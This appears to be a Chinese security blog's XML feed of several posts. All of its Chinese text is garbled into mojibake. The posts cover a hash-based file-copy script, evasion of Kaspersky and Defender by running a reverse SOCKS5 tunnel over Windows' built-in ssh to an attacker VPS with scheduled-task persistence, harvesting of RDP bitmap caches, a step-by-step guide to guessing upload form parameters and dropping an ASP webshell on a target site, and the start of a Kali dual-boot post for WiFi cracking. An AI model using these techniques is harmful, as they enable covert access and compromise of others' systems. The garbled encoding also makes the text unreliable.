ä¾‹å¦‚ï¼šè§£æç¬¬ä¸€è¡Œï¼Œæ ¹æ®ç¬¬ä¸€ä¸ª<code>md5</code>å€¼<code>38C45AC1A54F65732CFE56C7BCC17A87</code>éå†å½“å‰æ–‡ä»¶å¤¹åŠå­æ–‡ä»¶å¤¹æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶<code>123.exe</code>ï¼Œå†æ ¹æ®è§£æå‡ºçš„è·¯å¾„<code>"I_DONOT_è¿œæ§"</code>å¤åˆ¶åˆ°<code>"C:\I\DONOT\è¿œæ§"</code>ä¸‹ã€‚</p>
<h2 id="Code"><a class="header-anchor" href="#Code">Â¶</a>Code</h2>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼špython</p></div>
<span id="more"></span>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,hashlib,shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'æ–‡ä»¶ä¿¡æ¯.txt'</span>, encoding=<span class="string">'utf-8-sig'</span>, mode=<span class="string">'r'</span>) <span class="keyword">as</span> inF:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> inF:</span><br><span class="line">            temp = line.strip().split(<span class="string">'#'</span>)[<span class="number">0</span>].split(<span class="string">'\t\t'</span>)</span><br><span class="line">            <span class="built_in">print</span>(temp)</span><br><span class="line">            _md5 = temp[<span class="number">0</span>]</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> parent, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">'.\\'</span>,topdown=<span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">                    file_path = os.path.join(parent, filename)</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">'rb'</span>) <span class="keyword">as</span> fileF:</span><br><span class="line">                        md5obj = hashlib.md5()</span><br><span class="line">                        md5obj.update(fileF.read())</span><br><span class="line">                        _<span class="built_in">hash</span> = md5obj.hexdigest().upper()</span><br><span class="line">                        <span class="keyword">if</span> _md5 == _<span class="built_in">hash</span>:</span><br><span class="line">                            flag = <span class="number">1</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            dirFile = temp[<span class="number">2</span>].strip().split(<span class="string">'_'</span>)</span><br><span class="line">            pathTemp = <span class="string">'c:\\'</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> dirFile:</span><br><span class="line">                pathTemp += i+<span class="string">'\\'</span></span><br><span class="line">                os.mkdir(pathTemp)</span><br><span class="line">            shutil.copy(file_path, pathTemp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <tags>
        <tag>ç¬”è®°</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh - å…æ€socks5ä»£ç†</title>
    <url>/2023/08/15/ssh-%E5%85%8D%E6%9D%80socks5%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>å¦‚ä»Š <code>socks5</code> ä»£ç†éå¸¸å¤šï¼Œ<code>frp</code>,<code>iox</code> ç­‰ï¼Œä½†å°±æ˜¯å› ä¸ºä¼—æ‰€å‘¨çŸ¥ï¼Œå¯¼è‡´è¢«æ€è½¯æ€çš„ä½“æ— å®Œè‚¤</p>
<p>ä¹‹å‰å‘è¿‡ä¸€æ¬¡æ— å‚æ•°ç‰ˆ <code>frp</code>ï¼Œåœ¨<code>linux</code>ä¸Šå…æ€æ•ˆæœè¿˜ä¸é”™ï¼Œwin <code>defender</code>éƒ½è¿‡ä¸å»</p>
<p><code>iox</code> è‡ªå·±ç¼–è¯‘èƒ½å…æ€ä¸€éƒ¨åˆ†æ€è½¯ï¼Œå¦‚å¡å·´ä¸ªäººæ ‡å‡†ç‰ˆï¼Œè¿›ç¨‹ç±»ä¼¼è¿™æ · <code>avp.exe &lt;=&gt; Kaspersky</code></p>
<p>ä½†ç›®å‰é‡åˆ°å¡å·´æœåŠ¡å™¨ç‰ˆï¼Œæˆ–è€…è¯´æ˜¯æ•°æ®ä¸­å¿ƒç‰ˆï¼Œè‡ªç¼–è¯‘ <code>iox</code> è¿˜æ˜¯è¢«æ€ï¼Œè¿›ç¨‹ç±»ä¼¼è¿™æ · <code>kavfswp.exe &lt;=&gt; Kaspersky Security for Windows Server processes</code></p>
<p>æ€¥éœ€ä¸€ç§æ–°å‹å…æ€ <code>socks5</code> ä»£ç†ï¼ˆä¹Ÿè®¸å¹¶ä¸æ–°ğŸ¤¡ï¼‰</p>
<span id="more"></span>
<h2 id="ssh-socks5"><a class="header-anchor" href="#ssh-socks5">Â¶</a>ssh socks5</h2>
<p>ç°åœ¨æ–°ç‰ˆwindowsï¼Œwin10,win11 å‡è‡ªå¸¦<code>ssh</code>ï¼Œ<code>cmd</code> ä¸‹ç›´æ¥è¾“å…¥ <code>ssh</code> å³å¯ä½¿ç”¨</p>
<p>ssh å‘½ä»¤é™¤äº†ç™»é™†å¤–è¿˜æœ‰ä¸‰ç§ä»£ç†åŠŸèƒ½ï¼š</p>
<blockquote>
<p>æ­£å‘ä»£ç†ï¼ˆ-Lï¼‰ï¼šç›¸å½“äº iptable çš„ port forwarding<br>
åå‘ä»£ç†ï¼ˆ-Rï¼‰ï¼šç›¸å½“äº frp æˆ–è€… ngrok<br>
socks5 ä»£ç†ï¼ˆ-Dï¼‰ï¼šç›¸å½“äº ss/ssr</p>
</blockquote>
<p>åœ¨å®é™…ç¯å¢ƒä¸­åŸºæœ¬åªç”¨åå‘ä»£ç† <code>-R</code>ï¼Œssh çš„åŠ¨æ€è½¬å‘ä¼šåœ¨è¿œç¨‹åˆ›å»ºä¸€ä¸ªç›‘å¬ç«¯å£ï¼Œå¹¶ä¸”å°†è¯·æ±‚åˆ°è¯¥ç«¯å£çš„æµé‡å…¨éƒ¨è½¬å‘åˆ°æœ¬åœ°ç«¯å£ä¸Šï¼Œä»è€Œå®ç°ä»£ç†çš„åŠŸèƒ½</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh -NR 1080 user@vps</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>-C è¯·æ±‚ä¼šè¯é—´çš„æ•°æ®å‹ç¼©ä¼ é€’ã€‚å¯¹äºç½‘ç»œç¼“æ…¢çš„ä¸»æœºï¼Œå‹ç¼©å¯¹è¿æ¥æœ‰æ‰€æå‡ã€‚ä½†å¯¹ç½‘ç»œæµç•…çš„ä¸»æœºæ¥è¯´ï¼Œå‹ç¼©åªä¼šæ›´ç³Ÿç³•ã€‚<br>
-q é™é»˜æ¨¡å¼ã€‚å¤§å¤šæ•°è­¦å‘Šä¿¡æ¯å°†ä¸è¾“å‡ºã€‚<br>
-N æ˜ç¡®è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚ä»…ä½œç«¯å£è½¬å‘æ—¶æ¯”è¾ƒæœ‰ç”¨</p>
</blockquote>
<p>ä½¿ç”¨ä¸Šè¿°å‘½ä»¤åä¼šäº¤äº’è¾“å…¥<code>user</code>è´¦æˆ·å¯†ç ï¼Œä¹‹åä¼šåœ¨ <code>vps</code> ä¸Šå¼€å¯1080ç«¯å£</p>
<p>åœ¨ <code>vps</code> ä¸Šç›´æ¥å€ŸåŠ© <code>proxychains curl cip.cc</code> å³å¯éªŒè¯ä»£ç†æˆåŠŸ</p>
<h2 id="ssh-ä»£ç†å®æˆ˜"><a class="header-anchor" href="#ssh-ä»£ç†å®æˆ˜">Â¶</a>ssh ä»£ç†å®æˆ˜</h2>
<h3 id="1-äº¤äº’"><a class="header-anchor" href="#1-äº¤äº’">Â¶</a>1. äº¤äº’</h3>
<p>å®æˆ˜åœºæ™¯ç»å¤§å¤šæ•°éƒ½æ˜¯ä¸å¯äº¤äº’çš„ï¼Œæ‰€ä»¥é¦–å…ˆéœ€è¦è§£å†³çš„æ˜¯å¯†ç äº¤äº’é—®é¢˜</p>
<p>å¯†ç äº¤äº’å¯ä»¥ä½¿ç”¨ç§é’¥ç™»å½•è§£å†³</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">useradd -m user</span><br><span class="line">Passwd user</span><br><span class="line">ssh-keygen <span class="comment"># ç”Ÿæˆç§é’¥</span></span><br></pre></td></tr></tbody></table></figure>
<p>é‚£ä¹ˆå‘½ä»¤å˜ä¸º</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh -NR 1080 user@vps -i C:\programdata\id_rsa</span><br></pre></td></tr></tbody></table></figure>
<p>æœ¬æ¥æŒ‰ç…§åŸç†åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯winä¼šæŠ¥é”™ï¼Œæç¤ºæƒé™å¤ªopen ğŸ˜‚ï¼Œå¹¶ä¸”ç»§ç»­äº¤äº’è¾“å…¥å¯†ç </p>
<p><img src="ssh_permission.png" alt="ssh_permission"></p>
<p>é‚£å°±ç»™å¥¹æƒé™æä½ç‚¹ï¼Œlinux <code>chmod 400 id_rsa</code>ï¼Œä½†æ˜¯ä¸‹è½½å›æ¥å‘ç°è¿˜æ˜¯ä¸èƒ½ç”¨</p>
<p>æŸ¥è¯¢ <code>stackoverflow</code>æ‰¾åˆ°winè§£å†³æ–¹æ¡ˆ</p>
<blockquote>
<p><a href="https://stackoverflow.com/questions/48888365/openssh-using-private-key-on-windows-unprotected-private-key-file-error">https://stackoverflow.com/questions/48888365/openssh-using-private-key-on-windows-unprotected-private-key-file-error</a></p>
</blockquote>
<p>usernameä½¿ç”¨shell whoamiç»“æœå®Œæ•´å¡«å…¥</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">icacls C:\programdata\id_rsa /inheritance:r</span><br><span class="line">icacls C:\programdata\id_rsa /grant:r <span class="string">"%username%"</span>:<span class="string">"(R)"</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="icacls.png" alt="icacls"></p>
<h3 id="2-å¿½ç•¥æ£€æŸ¥"><a class="header-anchor" href="#2-å¿½ç•¥æ£€æŸ¥">Â¶</a>2. å¿½ç•¥æ£€æŸ¥</h3>
<p>é¦–æ¬¡ä½¿ç”¨sshè¿æ¥æ–°æœºå™¨ï¼Œä¼šäº¤äº’è¾“å…¥yes</p>
<p><img src="checking.png" alt="checking"></p>
<p>ä½¿ç”¨<code>-o StrictHostKeyChecking=no</code>ä¸æ£€æŸ¥ï¼Œåˆ™å‘½ä»¤å˜ä¸º</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh -NR 1080 user@vps -i C:\programdata\id_rsa -o StrictHostKeyChecking=no</span><br></pre></td></tr></tbody></table></figure>
<h3 id="3-ç«¯å£å¼€æ”¾ä½ç½®"><a class="header-anchor" href="#3-ç«¯å£å¼€æ”¾ä½ç½®">Â¶</a>3. ç«¯å£å¼€æ”¾ä½ç½®</h3>
<p>æŸ¥è¯¢ç«¯å£å‘ç°socksç«¯å£å¼€æ”¾åœ¨<code>127.0.0.1</code>ä¸Š</p>
<p><img src="netstat.png" alt="netstat"></p>
<p>é‚£è¿™æ ·åªèƒ½ä½¿ç”¨proxychainsæ¥å®ç°ä»£ç†ï¼Œæ— æ³•ä½¿ç”¨win <code>proxifier</code> è¿›è¡Œä»£ç†</p>
<p>å°è¯•å‘½ä»¤ä¸­åŠ å…¥<code>0.0.0.0</code>ï¼Œå¹¶ä¸ç”Ÿæ•ˆ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh -NR 0.0.0.0:1080 user@vps -i C:\programdata\id_rsa -o StrictHostKeyChecking=no</span><br></pre></td></tr></tbody></table></figure>
<p>ä¿®æ”¹vpsé…ç½®æ–‡ä»¶è§£å†³</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">		<span class="comment">#GatewayPorts no</span></span><br><span class="line">		GatewayPorts <span class="built_in">yes</span></span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></tbody></table></figure>
<p><img src="netstat2.png" alt="netstat2"></p>
<p>è‡³æ­¤æ‰€æœ‰é—®é¢˜å·²å…¨éƒ¨è§£å†³ï¼Œå¯åœ¨ <code>shell</code> ä¸ä¸Šä¼ ç¨‹åºå®ç° <code>socks5</code> ä»£ç†ï¼ˆç§é’¥é™¤å¤–ğŸ™ƒï¼‰</p>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2>
<p>è¯¥æ–¹æ³•é€‚ç”¨äºwin10åŠå…¶ä»¥ä¸Šæœºå™¨ï¼Œsshä¸ºwinè‡ªå¸¦ç¨‹åºï¼Œå®ç°å…æ€</p>
<p>å¯å½“ä½œä¸€ä¸ªæ½œä¼åŠ å›ºä½¿ç”¨ï¼Œè®¡åˆ’ä»»åŠ¡å®šæœŸåå¼¹ï¼Œä½†è¿™æ ·æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯vpsæ— éœ€å¯åŠ¨ç¨‹åºç›‘å¬ï¼Œåˆ°ç‚¹ä¼šè‡ªåŠ¨åå¼¹å›æ¥ï¼Œè‹¥ä¸æ‰‹åŠ¨killï¼Œç¨‹åºé©»ç•™æ—¶é—´é•¿ï¼Œæœ‰è¢«å‘ç°çš„é£é™©</p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/57630633">https://zhuanlan.zhihu.com/p/57630633</a></p>
<p><a href="https://blog.csdn.net/qq_19922839/article/details/126623031">https://blog.csdn.net/qq_19922839/article/details/126623031</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>å…æ€</tag>
        <tag>socks</tag>
        <tag>ssh</tag>
        <tag>åŠ å›º</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯æ”¶é›† - è¿œç¨‹æ¡Œé¢é‡ç°</title>
    <url>/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E9%87%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>å¸¸è§„çš„ä¿¡æ¯æ”¶é›†æŠ€æœ¯å°±ä¸å¤šè®²äº†ï¼Œå‰ä¸¤å¤©apt32ç –å®¶ä¸œç»™æˆ‘å‘æ¥ä¸€ç¯‡æ–‡ç« </p>
<blockquote>
<p><a href="https://www.freebuf.com/articles/web/279561.html">https://www.freebuf.com/articles/web/279561.html</a></p>
</blockquote>
<p>æˆ‘ä¸€çœ‹ï¼Œç‰›è›™ï¼Œrdpè¿œç¨‹æ¡Œé¢é‡ç°ï¼Œæ²¡æƒ³åˆ°ä¿¡æ¯æ”¶é›†è¿˜èƒ½æœ‰è¿™ç§å§¿åŠ¿ï¼Œå±å®ç¨€å¥‡ï¼Œäºæ˜¯è¯•ç©äº†ä¸€æ³¢</p>
<h2 id="åŸç†"><a class="header-anchor" href="#åŸç†">Â¶</a>åŸç†</h2>
<p>æ–‡ç« å†™çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘å°±ä¸èµ˜è¿°äº†ï¼Œå¤§è‡´åŸç†å°±æ˜¯è¿œç¨‹æ¡Œé¢ä¼šæœ‰ç¼“å­˜ï¼Œè§£æç¼“å­˜é‡ç°rdp</p>
<h2 id="å¤ç°"><a class="header-anchor" href="#å¤ç°">Â¶</a>å¤ç°</h2>
<p>æ‰“å¼€ç¼“å­˜ç›®å½•<code>C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache</code>ï¼Œçœ‹åˆ°ç¡®å®æœ‰æ–‡ä»¶</p>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼šä¿¡æ¯æ”¶é›†ï¼Œå·¥å…·åˆ©ç”¨</p></div>
<span id="more"></span>
<p><img src="bmc.png" alt="bmc"></p>
<p>æœ‰å¤§ä½¬å†™å¥½äº†å·¥å…·ï¼Œç›´æ¥ç”¨å·¥å…·è§£æè¯¥æ–‡ä»¶ï¼Œæƒ³çŸ¥é“åŸç†çš„å¯ä»¥å»çœ‹åŸæ–‡ç« </p>
<blockquote>
<p><a href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a></p>
</blockquote>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">bmc-tools.py -s "C:\Users\Administrator\AppData\Local\Microsoft\Terminal Server Client\Cache" -d d:\intranet\bmc-tools</span><br></pre></td></tr></tbody></table></figure>
<p><img src="bmc-tools.png" alt="bmc-tools"><br>
æå–å®Œæˆï¼Œ20mæ–‡ä»¶æå–å‡º2553ä¸ªæ–‡ä»¶ï¼Œè¿˜æ˜¯è›®å¤šçš„ï¼Œæ‰“å¼€çœ‹ä¸‹</p>
<p><img src="bmc-tools_2.png" alt="bmc-tools_2"></p>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2>
<p>å¾ˆæ–°å¥‡çš„ä¸€ç§ä¿¡æ¯æ”¶é›†æ–¹å¼ï¼Œè™½ç„¶ç”¨å¤„ä¸æ˜¯é‚£ä¹ˆå¤§ï¼Œä½†åœ¨å®åœ¨æ— æ³•æ”¶é›†åˆ°ä¿¡æ¯çš„æ—¶å€™è¿˜æ˜¯å¯ä»¥å°è¯•ä¸€ä¸‹ï¼Œå±äºèµ°æŠ•æ— è·¯çš„ä¸€ç§å¥‡æŠ€æ·«å·§ï¼Œç‰¹æ­¤è®°å½•</p>
]]></content>
      <tags>
        <tag>å¥‡æŠ€æ·«å·§</tag>
        <tag>ç¬”è®°</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
        <tag>3389</tag>
        <tag>è¿œç¨‹æ¡Œé¢</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸Šä¼  - çŒœæµ‹è¡¨å•å‚æ•°getshell</title>
    <url>/2019/10/18/%E4%B8%8A%E4%BC%A0-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%8D%95%E5%8F%82%E6%95%B0getshell/</url>
    <content><![CDATA[<h2 id="0x01-å‰è¨€"><a class="header-anchor" href="#0x01-å‰è¨€">Â¶</a>0x01 å‰è¨€</h2>
<p>å¤§ä½¬ç»™äº†ä¸ªä¸Šä¼ ç‚¹ï¼Œè¯´æ˜¯è¿™ä¸ªç‚¹è¶³å¤Ÿå†™ä¸€ç¯‡æ•™ç¨‹äº†ï¼Œé‚å°è¯•ä¸€ä¸‹ï¼Œçœ‹è‡ªå·±å¾—è¡Œä¸ã€‚<br>
ä¸Šä¼ ç‚¹å¦‚ä¸‹ï¼š</p>
<blockquote>
<p><code>https://subdomain.target.com/UpLoad/UpLoad.aspx</code></p>
</blockquote>
<p>è®¿é—®ä¹‹ï¼Œ<code>302</code>è·³è½¬åˆ°<code>User_Status</code></p>
<img src="/2019/10/18/%E4%B8%8A%E4%BC%A0-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%8D%95%E5%8F%82%E6%95%B0getshell/user_status.png" class="">
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼š<span class="label success">ä¸Šä¼ </span>, <span class="label success">getshell</span></p></div>
<span id="more"></span>
<h2 id="0x02-çŒœæµ‹å‚æ•°"><a class="header-anchor" href="#0x02-çŒœæµ‹å‚æ•°">Â¶</a>0x02 çŒœæµ‹å‚æ•°</h2>
<p>æ²¡æœ‰ä»»ä½•åŠŸèƒ½ç‚¹ï¼Œæ˜¾ç„¶æ˜¯éœ€è¦çŒœå‚æ•°äº†ï¼Œä¸å…¶è¯´æ˜¯çŒœæµ‹ä¸å¦‚è¯´æ˜¯æ„é€ ï¼Œä½¿ç”¨é€šç”¨è¡¨å•ä¸Šä¼ å‚æ•°</p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=--------1036030574</span><br><span class="line"></span><br><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="Filedata"; filename="pic.jpg"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line"></span><br><span class="line">----------1036030574--</span><br></pre></td></tr></tbody></table></figure>
<p><img src="oneForm.png" alt="oneForm"></p>
<p>æ˜¾ç„¶<code>response</code>å¹¶æ— å˜åŒ–ï¼Œä¹Ÿæ²¡æœ‰ä¸Šä¼ æˆåŠŸçš„æç¤ºï¼Œæ›´æ¢å‡ ä¸ªå¸¸ç”¨çš„<code>name</code>ï¼Œ<code>filename</code>åä¸€æ ·æ— æœ<br>
æ— å¤´è‹è‡èˆ¬çš„çŒœæµ‹æ˜¾ç„¶ä¸è¡Œï¼ŒæŸ¥çœ‹æºç æ‰¾æ‰¾æœ‰ç”¨ä¿¡æ¯<br>
å¹¶æ— æœ‰ä»·å€¼ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹<code>js</code>ï¼Œ<code>jquery</code>å¿½ç•¥ä¸çœ‹ï¼Œç›´æ¥çœ‹ç¬¬äºŒä¸ª<code>comfun.js</code></p>
<p><img src="view-source.png" alt="view-source"></p>
<p>éšä¾¿ç¿»ç¿»ï¼Œæœç„¶å‘ç°ç‚¹æœ‰ç”¨çš„ä¸œè¥¿ï¼Œå‡½æ•°<code>UpLoadPic</code></p>
<p><img src="comfun.js-uploadPic.png" alt="comfun.js-uploadPic"></p>
<p>ç›´æ¥è®¿é—®<code>/UpLoad/UpLoadPic.aspx</code>ï¼Œä¸€æ ·<code>302</code>è·³è½¬åˆ°<code>User_Status</code></p>
<p><img src="uploadPic302.png" alt="uploadPic302"></p>
<p>å°è¯•æŠŠå‡½æ•°ä¸­çš„å‚æ•°å…¨éƒ¨æ„é€ æˆè¡¨å•æäº¤</p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="ObjNM"; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="FilePath"; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">pic.jpg</span><br><span class="line"></span><br><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="UpLoadBtnNM"; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="DeleteBtnNM"; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="MaxFileSize"; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="MaxSize"; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">----------1036030574</span><br><span class="line">Content-Disposition: form-data; name="IsCover"; </span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">----------1036030574--</span><br></pre></td></tr></tbody></table></figure>
<p>ä¸Šä¼ é¡µé¢å‡ºç°äº†</p>
<p><img src="uploadPic-post.png" alt="uploadPic-post"></p>
<p>æœæ–­ä¸Šä¼ <code>asp</code>ï¼Œæç¤ºç™½åå•</p>
<p><img src="uploadPic-asp.png" alt="uploadPic-asp"></p>
<p><code>iis8.0</code> å¹¶æ— è§£ææ¼æ´ï¼Œéšä¾¿è¯•è¯•ï¼Œçˆ†å‡ºç»å¯¹è·¯å¾„<code>D:\web_root\UpLoad</code>ï¼Œä¸çŸ¥æ˜¯å¦æœ‰ç”¨ï¼Œå…ˆç•™ç€</p>
<p><img src="root_path.png" alt="root_path"></p>
<p>ç»§ç»­<code>fuzz</code>ï¼Œå‘ç°æ— æ³•ç»•è¿‡ï¼Œå°±è¿ç™½åå•çš„<code>jpg</code>éƒ½æ— æ³•ä¸Šä¼ ï¼Œç»è¿‡å¤šæ¬¡<code>fuzz</code>ï¼Œ<code>txt</code>å¯ä¸Šä¼ ï¼Œå¹¶è¿”å›æ–‡ä»¶å</p>
<p><img src="uploadPic-txt-1.png" alt="uploadPic-txt-1"></p>
<p>æ ¹æ®ä¸Šè¿°ç»å¯¹è·¯å¾„ï¼Œç›´æ¥åŠ åœ¨<code>/upload/</code>ï¼Œå¾—åˆ°ç›¸å¯¹è·¯å¾„</p>
<p><img src="uploadPic-txt-2.png" alt="uploadPic-txt-2"></p>
<h2 id="0x03-getshell"><a class="header-anchor" href="#0x03-getshell">Â¶</a>0x03 getshell</h2>
<p>ç»æµ‹è¯•ï¼Œè¯¥ä¸Šä¼ ç‚¹ç™½åå•æ— æ³•ç»•è¿‡ï¼Œé‚æ”¾å¼ƒï¼Œå¦è¾Ÿè¹Šå¾„<br>
ç»§ç»­å›å¤´çœ‹<code>js</code>ï¼Œå‡½æ•°<code>UpLoadPic</code>ä¸‹è¿˜æœ‰å‡½æ•°<code>UpLoadFile</code></p>
<p><img src="comfun.js-upload.png" alt="comfun.js-upload"></p>
<p>åŒç†æ„é€ è¡¨å•ä¸Šä¼ ï¼Œçœ‹åˆ°<code>æ¡£æ¡ˆæ ¼å¼ä¸é™</code>ï¼Œæ„Ÿè§‰å¸Œæœ›æ¥äº†</p>
<p><img src="upload-post.png" alt="upload-post"></p>
<p>ç›´æ¥æ¢­å“ˆ<code>asp</code></p>
<p><img src="upload-asp.png" alt="upload-asp"></p>
<p>å“¦è±ï¼Œgetshellï¼</p>
<p><img src="getshell.png" alt="getshell"></p>
<h2 id="0x04-æ€»ç»“"><a class="header-anchor" href="#0x04-æ€»ç»“">Â¶</a>0x04 æ€»ç»“</h2>
<p>è¯¥ç¯‡é‡ç‚¹åœ¨äºæ„é€ è¡¨å•å‚æ•°ï¼Œåœ¨æ‰«åˆ°ä¸€äº›ä¸Šä¼ é¡µé¢æ— æŒ‰é’®æ—¶ä¸è¦æ”¾å¼ƒï¼ŒçŒœæµ‹å‚æ•°æœ‰æ—¶èƒ½ä¸€å‡»å¿…æ€<br>
å¦å¤–<code>header</code>ä¸­<code>boundary=--------1036030574</code>ä¸å¯ç¼ºå°‘ï¼Œè¡¨å•åˆ†å‰²çº¿è¦ä¿æŒä¸€è‡´<br>
è‡³äºåé¢çš„å°±æ˜¯æ‰¾å¯¹åŠŸèƒ½ç‚¹ï¼Œä»»æ„ä¸Šä¼ äº†ã€‚</p>
]]></content>
      <tags>
        <tag>ä¸Šä¼ </tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>åŒç³»ç»Ÿå®‰è£… - win7ä¸‹å®‰è£…kali2.0</title>
    <url>/2018/04/19/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85-win7%E4%B8%8B%E5%AE%89%E8%A3%85kali2-0/</url>
    <content><![CDATA[<h1>å‰è¨€</h1>
<p>æ—§ç¬”è®°æœ¬æ·˜æ±°äº†ï¼Œå–æ‰å¯æƒœï¼Œæ‰”äº†æ›´å¯æƒœï¼Œå¹³æ—¶ç»å¸¸æœ‰ç ´è§£wifiçš„éœ€è¦ï¼Œå¹²è„†æŠŠå®ƒåšæˆåŒç³»ç»Ÿï¼Œwin+linuxä¸¤ä¸è¯¯ï¼Œç”±äºæˆ‘çš„åç¡•æ˜¯UEFI+GPTï¼Œå¯¼è‡´æˆ‘åŒç³»ç»Ÿæ€ä¹ˆéƒ½è£…ä¸æˆåŠŸï¼Œç”±æ­¤å¼€å¯äº†æˆ‘å´å²–çš„è¸©å‘è·¯ã€‚</p>
<h1>UEFI</h1>
<p>å…ˆæ¶è¡¥ä¸€æ³¢BIOSï¼ŒMBRï¼ŒUEFIï¼ŒGPT</p>
<blockquote>
<p><a href="http://baijiahao.baidu.com/s?id=1571449106519556&amp;wfr=spider&amp;for=pc">è¿˜æ²¡å¼„æ˜ç™½BIOS+MBRå’ŒUEFI+GPTï¼Ÿçœ‹è¿™ä¸€ç¯‡è®²è§£å°±è¶³å¤Ÿäº†ï¼</a></p>
<p><a href="https://blog.csdn.net/mao0514/article/details/51162915">EFIã€UEFIã€MBRã€GPTçš„åŒºåˆ«</a></p>
<p><a href="https://www.zhihu.com/question/28471913">UEFI+GPTä¸BIOS+MBRå„è‡ªæœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ</a></p>
</blockquote>
<p>çœ‹äº†è¿™äº›åº”è¯¥æœ‰äº†ä¸€å®šçš„è®¤è¯†ï¼Œä¸€èˆ¬ç»„åˆä¸ºï¼š</p>
<ul>
